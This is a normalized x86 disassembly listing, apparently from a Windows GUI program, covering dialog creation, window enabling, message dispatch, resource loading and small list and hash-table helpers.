jmp r-xdata
mov [ ecx ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_41e0b3
mov eax sub_42af1c
call sub_410a78
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
and [ ebp - 0x4 ] 0x0
push edi
mov [ ebp - 0x10 ] esp
push esi
push [ ebp + 0xc ]
call sub_425309
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] esi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_41e10c
mov eax sub_42af28
call sub_410a78
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x10 ] esp
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi [ ecx + 0x20 ]
cmp esi edi
jne r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jne r-xdata
call sub_425399
push [ ebp + 0x14 ]
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] edi
push [ ebp + 0xc ]
call [ eax + 0x28 ]
mov ecx [ ebp + 0x18 ]
cmp ecx edi
je r-xdata
mov eax 0x80004001
jmp r-xdata
cmp [ ebp + 0xc ] edi
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ecx + 0x4 ] edi
mov [ ecx ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
sub_41e1eb
push esi
mov esi ecx
push edi
xor edi edi
mov ecx [ esi + 0x14 ]
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
call sub_41e36c
mov [ esi + 0x14 ] edi
pop edi
pop esi
retn
sub_41e234
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
mov [ esi + 0x10 ] ecx
mov ecx [ esp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0xc ]
mov [ eax ] ecx
inc [ esi + 0xc ]
and [ eax + 0x8 ] 0x0
pop esi
retn 0x8
push 0xc
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_41e34c
mov ecx [ esi + 0x18 ]
add eax 0x4
lea edx [ ecx + ecx * 2 ]
dec ecx
test ecx ecx
lea eax [ eax + edx * 4 - 0xc ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
sub eax 0xc
dec ecx
jne r-xdata
sub_41e2a5
push esi
mov esi ecx
push 0x0
push [ esi + 0x8 ]
call sub_41e234
mov ecx [ esp + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] eax
mov [ ecx ] eax
jmp r-xdata
mov [ esi + 0x8 ] eax
pop esi
retn 0x4
sub_41e2ce
mov eax [ ecx + 0x4 ]
push esi
mov edx [ eax ]
mov esi [ eax + 0x8 ]
test edx edx
mov [ ecx + 0x4 ] edx
je r-xdata
and [ ecx + 0x8 ] 0x0
and [ edx + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_41e28c
mov eax esi
pop esi
retn
sub_41e2f2
mov eax [ esp + 0x4 ]
push esi
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov esi [ eax ]
mov [ edx ] esi
mov edx [ eax ]
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov edx [ eax ]
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov edx [ eax + 0x4 ]
mov [ ecx + 0x8 ] edx
jmp r-xdata
cmp eax [ ecx + 0x8 ]
jne r-xdata
push eax
call sub_41e28c
pop esi
retn 0x4
sub_41e329
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
cmp ecx [ esp + 0x4 ]
jne r-xdata
test eax eax
je r-xdata
jmp r-xdata
retn 0x8
sub_41e3c5
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
mov ebx [ esp + 0xc ]
je r-xdata
push eax
call sub_4221e2
and [ esi + 0x4 ] 0x0
pop ecx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn 0x8
push edi
mov edi ebx
shl edi 0x2
push edi
call sub_4221b9
push edi
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_410a20
add esp 0x10
pop edi
sub_41e40a
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
call sub_41e36c
and [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_4221e2
and [ esi + 0x4 ] 0x0
pop ecx
sub_41e45e
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
inc [ esi + 0xc ]
mov [ esi + 0x10 ] ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
pop esi
retn
push 0xc
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_41e34c
mov ecx [ esi + 0x18 ]
add eax 0x4
lea edx [ ecx + ecx * 2 ]
dec ecx
test ecx ecx
lea eax [ eax + edx * 4 - 0xc ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
sub eax 0xc
dec ecx
jne r-xdata
sub_41e4c4
push esi
mov esi [ esp + 0x8 ]
mov eax esi
xor edx edx
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + edx * 4 ]
cmp [ eax + 0x4 ] esi
je r-xdata
pop esi
retn 0x8
mov eax [ eax ]
jmp r-xdata
test eax eax
je r-xdata
sub_41e4f6
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov edx [ esi + edx * 4 ]
cmp [ edx + 0x4 ] edi
je r-xdata
mov eax [ edx + 0x8 ]
jmp r-xdata
mov edx [ edx ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test edx edx
je r-xdata
sub_41e529
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
push edi
call sub_41e4c4
test eax eax
jne r-xdata
pop edi
add eax 0x8
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx esi
call sub_41e45e
mov [ eax + 0x4 ] edi
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx * 4 ] eax
push 0x1
mov ecx esi
push [ esi + 0x8 ]
call sub_41e3c5
sub_41e579
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esi + edx * 4 ]
lea edx [ esi + edx * 4 ]
cmp [ eax + 0x4 ] edi
je r-xdata
mov esi [ eax ]
push eax
mov [ edx ] esi
call sub_41e4ab
push 0x1
pop eax
jmp r-xdata
mov edx eax
mov eax [ eax ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
sub_41e5bb
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
cmp esi 0xffffffff
jne r-xdata
mov edi [ esi ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x8 ]
xor edi edi
test edx edx
jbe r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ ecx ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esi + 0x8 ]
pop edi
mov [ ecx ] eax
pop esi
retn 0xc
mov eax [ esi + 0x4 ]
push ebx
mov ebx [ ecx + 0x8 ]
xor edx edx
shr eax 0x4
div ebx
inc edx
cmp edx ebx
jae r-xdata
mov eax [ ecx + 0x4 ]
pop ebx
mov eax [ ecx + 0x4 ]
lea eax [ eax + edx * 4 ]
inc edi
add eax 0x4
cmp edi edx
jb r-xdata
inc edx
add eax 0x4
cmp edx ebx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
mov edi [ eax ]
test edi edi
jne r-xdata
sub_41e62d
cmp [ esp + 0x8 ] 0x110
jne r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_41f40e
push eax
push r--data
call sub_422fc3
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ eax ]
mov ecx eax
call [ edx + 0xbc ]
jmp r-xdata
retn 0x10
sub_41e66d
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_41fcaf
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx esi
call sub_4208c3
test eax eax
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ edi + 0x4 ] 0x100
jne r-xdata
cmp [ eax + 0x50 ] 0x0
je r-xdata
push edi
mov ecx esi
call sub_4213f3
mov eax [ edi + 0x8 ]
cmp eax 0x1b
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffff0
push [ edi ]
call [ GetWindowLongA@IAT ]
test al 0x4
je r-xdata
cmp eax 0x3
jne r-xdata
push r--data
push [ edi ]
call sub_424eef
test eax eax
je r-xdata
push 0x2
push [ esi + 0x1c ]
call [ GetDlgItem@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x111
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push eax
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
sub_41e706
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
push edi
push [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x10 ]
push edi
push ebx
call sub_421e35
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
test bh 0x80
je r-xdata
cmp edi 0xffffffff
jne r-xdata
xor eax eax
cmp ebx 0xf000
jae r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_41f3e7
test eax eax
je r-xdata
call sub_4229ff
test eax eax
je r-xdata
push [ ebp + 0x14 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x10 ]
push edi
push ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x10 ]
push edi
push ebx
call [ edx + 0xc ]
test eax eax
je r-xdata
sub_41e7a7
mov eax sub_42aa04
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41fa5a
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
call sub_41fc17
sub_41e7e5
mov eax sub_42aa20
call sub_410a78
sub esp 0x34
push ebx
push esi
xor ebx ebx
push edi
cmp [ ebp + 0x10 ] ebx
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x24 ] esi
jne r-xdata
call sub_4272f7
mov edi [ eax + 0x1038 ]
push 0x10
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_421665
push 0x3c000
call sub_421665
cmp edi ebx
je r-xdata
call sub_4272f7
mov eax [ eax + 0x8 ]
mov [ ebp + 0x10 ] eax
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx esi
call [ eax + 0xb4 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
push eax
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x8 ]
call sub_423270
add esp 0xc
xor ecx ecx
cmp eax ebx
sete cl
mov eax ecx
cmp eax ebx
jne r-xdata
push [ ebp + 0x8 ]
mov eax [ edi ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x40 ]
call sub_4230bf
push [ ebp - 0x20 ]
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_4233f9
lea ecx [ ebp - 0x40 ]
call sub_42315c
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_42314e
cmp [ ebp - 0x14 ] ebx
je r-xdata
push 0x2a
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
or [ esi + 0x2c ] 0xffffffff
or [ esi + 0x24 ] 0x10
push esi
call sub_41f89a
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
push [ ebp - 0x14 ]
call [ GlobalLock@IAT ]
mov [ ebp + 0x8 ] eax
push r--data
push [ ebp - 0x1c ]
call sub_41051e
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ eax + 0x1c ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0x20 ] 0x8
jne r-xdata
push r--data
push [ ebp - 0x1c ]
call sub_41051e
pop ecx
test eax eax
pop ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp edi ebx
je r-xdata
push ebx
push sub_41e62d
push eax
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call [ CreateDialogIndirectParamA@IAT ]
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] bl
call sub_422478
jmp r-xdata
mov [ ebp - 0x20 ] ebx
push r--data
push [ ebp - 0x1c ]
call sub_41051e
pop ecx
test eax eax
pop ecx
jne r-xdata
call sub_41f8e6
test eax eax
jne r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
cmp [ ebp - 0x18 ] ebx
je r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0xb4 ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
test [ esi + 0x24 ] 0x10
jne r-xdata
xor eax eax
cmp [ ebp - 0x18 ] ebx
setne al
push [ ebp - 0x14 ]
call [ GlobalUnlock@IAT ]
push [ ebp - 0x14 ]
call [ GlobalFree@IAT ]
push [ ebp - 0x18 ]
call [ DestroyWindow@IAT ]
mov [ ebp - 0x18 ] ebx
sub_41ea14
push esi
push edi
mov esi ecx
call sub_41efc6
lea edi [ esi + 0x3c ]
push 0x20
push 0x0
push edi
mov [ esi ] r--data
call sub_410a20
mov eax [ esp + 0x1c ]
add esp 0xc
mov [ esi + 0x50 ] eax
mov eax [ esp + 0xc ]
movzx ecx ax
mov [ edi ] eax
mov [ esi + 0x40 ] ecx
mov eax esi
pop edi
pop esi
retn 0x8
sub_41ea4d
push esi
push edi
mov esi ecx
call sub_4272f7
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
push 0x0
mov ecx eax
call sub_425811
lea ecx [ esi + 0x54 ]
push ecx
push eax
call sub_4259b7
push esi
mov edi eax
call sub_41f89a
mov eax edi
pop edi
pop esi
retn
mov eax [ eax + 0x1c ]
sub_41ea87
push esi
mov esi ecx
call sub_41f8e6
mov ecx esi
call sub_41f465
push [ esi + 0x54 ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
and [ esi + 0x54 ] 0x0
call sub_4272f7
mov eax [ eax + 0x4 ]
pop esi
test eax eax
je r-xdata
push 0x1
push [ esi + 0x54 ]
call [ EnableWindow@IAT ]
retn
push 0x1
mov ecx eax
call sub_425811
sub_41eac9
mov eax sub_42aa2c
call sub_410a78
sub esp 0x18
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] esi
mov eax [ esi + 0x48 ]
mov edi [ esi + 0x44 ]
mov [ ebp - 0x18 ] eax
call sub_4272f7
cmp [ esi + 0x40 ] 0x0
mov ebx [ eax + 0xc ]
je r-xdata
test edi edi
je r-xdata
call sub_4272f7
mov ebx [ eax + 0xc ]
push 0x5
push [ esi + 0x40 ]
push ebx
call [ FindResourceA@IAT ]
push eax
push ebx
call [ LoadResource@IAT ]
mov edi eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
push edi
call [ LockResource@IAT ]
mov [ ebp - 0x18 ] eax
mov ecx esi
call sub_41ea4d
mov [ ebp - 0x14 ] eax
call sub_41f8e6
xor edi edi
cmp [ ebp - 0x14 ] edi
mov [ ebp - 0x20 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x4 ] edi
call sub_41f89a
push [ ebp - 0x14 ]
call sub_41f3e7
push ebx
push eax
push [ ebp - 0x18 ]
mov ecx esi
call sub_41e7e5
cmp eax edi
je r-xdata
push [ ebp - 0x14 ]
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x20 ] edi
je r-xdata
test [ esi + 0x24 ] 0x10
je r-xdata
push edi
push [ ebp - 0x14 ]
call [ EnableWindow@IAT ]
mov [ ebp - 0x20 ] 0x1
cmp [ ebp - 0x14 ] edi
je r-xdata
push 0x1
push [ ebp - 0x14 ]
call [ EnableWindow@IAT ]
cmp [ esi + 0x1c ] edi
je r-xdata
push 0x4
mov ecx esi
pop ebx
call sub_421a57
test ah 0x1
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x58 ]
mov ecx esi
call sub_41ea87
mov eax [ esi + 0x2c ]
call [ GetActiveWindow@IAT ]
cmp eax [ esi + 0x1c ]
jne r-xdata
push 0x97
push edi
push edi
push edi
push edi
push edi
mov ecx esi
call sub_421b3d
jmp r-xdata
push ebx
mov ecx esi
call sub_421423
push 0x5
pop ebx
push [ ebp - 0x14 ]
call [ SetActiveWindow@IAT ]
sub_41ec4c
push esi
push edi
push [ esp + 0xc ]
mov esi ecx
mov edi [ esi ]
call sub_424df1
push eax
mov ecx esi
call [ edi + 0xc0 ]
mov ecx esi
call sub_41f34e
pop edi
pop esi
retn 0x8
sub_41ec70
push esi
mov esi ecx
push edi
mov eax [ esi ]
call [ eax + 0xcc ]
call sub_4272f7
mov ecx [ eax + 0x1038 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_41f34e
mov edi eax
test edi edi
je r-xdata
mov eax [ esi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
test [ esi + 0x25 ] 0x1
je r-xdata
mov edx [ esi + 0x4c ]
test edx edx
je r-xdata
push 0x0
push 0x0
push [ esi + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_41f3e7
test eax eax
je r-xdata
mov edx [ ecx ]
push eax
push [ esi + 0x40 ]
push esi
call [ edx + 0x20 ]
mov edi [ ecx ]
push eax
push edx
push esi
call [ edi + 0x1c ]
jmp r-xdata
mov ecx eax
call sub_421bf5
xor edi edi
push 0xffffffff
mov ecx esi
call sub_41ec29
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
retn 0x8
sub_41ecf8
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_4272f7
xor edi edi
cmp [ eax + 0x4 ] edi
jne r-xdata
call sub_408750
cmp eax edi
mov esi 0xe146
je r-xdata
xor eax eax
jmp r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
lea ecx [ ebp - 0x8 ]
push ecx
push edi
mov edx [ eax ]
push edi
push esi
mov ecx eax
call [ edx + 0xc ]
mov edx [ eax ]
lea ecx [ ebp - 0x8 ]
push ecx
push edi
push edi
push esi
mov ecx eax
call [ edx + 0xc ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push 0x1
pop eax
jmp r-xdata
sub_41ed51
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
push [ esi + 0x40 ]
mov ecx esi
call sub_4212d1
push eax
call sub_421321
jmp r-xdata
push 0xffffffff
mov ecx esi
call sub_41ec29
xor eax eax
pop esi
retn
push 0x0
mov ecx esi
call sub_421060
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0xe146
mov ecx esi
call sub_4219cc
mov esi eax
test esi esi
je r-xdata
push 0x1
pop eax
pop esi
retn
call sub_41ecf8
neg eax
sbb eax eax
mov ecx esi
and eax 0x5
push eax
call sub_421b8c
sub_41edd7
push esi
push edi
mov edi ecx
cmp [ edi + 0x40 ] 0x0
mov esi [ edi + 0x48 ]
mov eax [ edi + 0x44 ]
je r-xdata
test eax eax
je r-xdata
push ebx
call sub_4272f7
mov ebx [ eax + 0xc ]
push 0x5
push [ edi + 0x40 ]
push ebx
call [ FindResourceA@IAT ]
push eax
push ebx
call [ LoadResource@IAT ]
pop ebx
push 0x1
test esi esi
pop eax
je r-xdata
push eax
call [ LockResource@IAT ]
mov esi eax
pop edi
pop esi
retn
cmp [ esi + 0x2 ] 0xffff
mov ecx [ esi ]
jne r-xdata
mov ax [ esi + 0xa ]
mov si [ esi + 0xc ]
mov ecx [ esi + 0xc ]
mov ax [ esi + 0x12 ]
mov si [ esi + 0x14 ]
jmp r-xdata
xor eax eax
test ax ax
jne r-xdata
test cx 0x1801
jne r-xdata
test si si
jne r-xdata
push 0x1
pop eax
jmp r-xdata
sub_41ee67
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx + 0x3c ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ eax ]
push 0x1
push esi
mov ecx eax
call [ edx + 0x98 ]
xor eax eax
lea esi [ eax + 0x20000 ]
test esi esi
je r-xdata
pop esi
retn 0x8
sub_41efc6
push esi
mov esi ecx
call sub_421ce9
push 0x20
lea eax [ esi + 0x1c ]
push 0x0
push eax
mov [ esi ] r--data
call sub_410a20
add esp 0xc
mov eax esi
pop esi
retn
sub_41f004
push esi
push edi
mov esi ecx
call sub_421ce9
lea edi [ esi + 0x1c ]
push 0x20
push 0x0
push edi
mov [ esi ] r--data
call sub_410a20
mov eax [ esp + 0x18 ]
add esp 0xc
mov [ edi ] eax
mov eax esi
pop edi
pop esi
retn 0x4
sub_41f030
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetWindowLongA@IAT ]
mov ecx [ ebp + 0x10 ]
not ecx
and ecx eax
or ecx [ ebp + 0x14 ]
cmp eax ecx
jne r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetWindowLongA@IAT ]
mov eax [ ebp + 0x18 ]
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
or al 0x17
push eax
push ecx
push ecx
push ecx
push ecx
push ecx
push [ ebp + 0x8 ]
call [ SetWindowPos@IAT ]
pop ebp
retn 0x14
sub_41f0d6
push ebp
mov ebp esp
sub esp 0x10
test [ ebp + 0x13 ] 0x10
push esi
jne r-xdata
pop esi
leave
retn 0xc
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_421a57
test eax 0x50000000
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push eax
call sub_41f3e7
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xac ]
test eax eax
je r-xdata
mov ecx eax
call sub_421bb3
test eax eax
jne r-xdata
push 0x0
mov ecx esi
call sub_421118
sub_41f14f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
call sub_421a57
test eax 0x40000000
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx esi
call sub_42089b
mov edi [ ebp + 0x10 ]
mov ebx eax
mov ecx edi
call sub_42089b
cmp ebx eax
je r-xdata
mov eax [ esi + 0x1c ]
test edi edi
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x36e
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
sub_41f1b0
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xfffffffe
push esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x201
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_42089b
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x207
je r-xdata
push [ eax + 0x1c ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_41f3e7
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x10 ] 0x204
jne r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call sub_41f3e7
cmp esi eax
je r-xdata
mov ecx esi
call sub_421bb3
test eax eax
je r-xdata
push [ esi + 0x1c ]
call [ SetForegroundWindow@IAT ]
push 0x1
pop eax
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_41f226
mov eax sub_42aa38
call sub_410a78
sub esp 0x34
push ebx
push esi
push edi
mov ecx rw-data
mov [ ebp - 0x10 ] esp
push sub_426477
call sub_4278ac
mov ebx eax
push 0x7
pop ecx
lea edi [ ebp - 0x40 ]
lea eax [ ebx + 0x34 ]
and [ ebp - 0x4 ] 0x0
mov esi eax
mov [ ebp - 0x14 ] ebx
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
cmp esi 0x2
mov [ ebx + 0x3c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebx + 0x38 ] esi
mov [ ebx + 0x40 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
cmp esi 0x110
jne r-xdata
mov ecx [ edi + 0x34 ]
test ecx ecx
je r-xdata
push [ ebp + 0x18 ]
mov eax [ edi ]
mov ecx edi
push [ ebp + 0x14 ]
push esi
call [ eax + 0x98 ]
cmp esi 0x110
mov [ ebp + 0x18 ] eax
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_41f0b3
mov eax [ ecx ]
push 0x0
call [ eax + 0x5c ]
push 0x7
mov eax [ ebp + 0x18 ]
lea edi [ ebx + 0x34 ]
pop ecx
lea esi [ ebp - 0x40 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
push [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_41f0d6
jmp r-xdata
sub_41f2d0
call sub_4229ff
mov ecx [ ebp - 0x14 ]
mov edx [ eax ]
add ecx 0x34
push ecx
mov ecx eax
push [ ebp + 0xc ]
call [ edx + 0x6c ]
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x18 ] eax
call sub_423058
mov eax r-xdata
retn
sub_41f319
push esi
push sub_426477
mov ecx rw-data
call sub_4278ac
mov esi eax
call [ GetMessageTime@IAT ]
mov [ esi + 0x44 ] eax
call [ GetMessagePos@IAT ]
movsx ecx ax
shr eax 0x10
movsx eax ax
mov [ esi + 0x48 ] ecx
mov [ esi + 0x4c ] eax
lea eax [ esi + 0x34 ]
pop esi
retn
sub_41f34e
push esi
mov esi ecx
push sub_426477
mov ecx rw-data
call sub_4278ac
push [ eax + 0x40 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa0 ]
pop esi
retn
sub_41f375
mov eax sub_42aa4e
call sub_410a78
push esi
call sub_42731d
mov esi eax
cmp [ esi + 0x14 ] 0x0
jne r-xdata
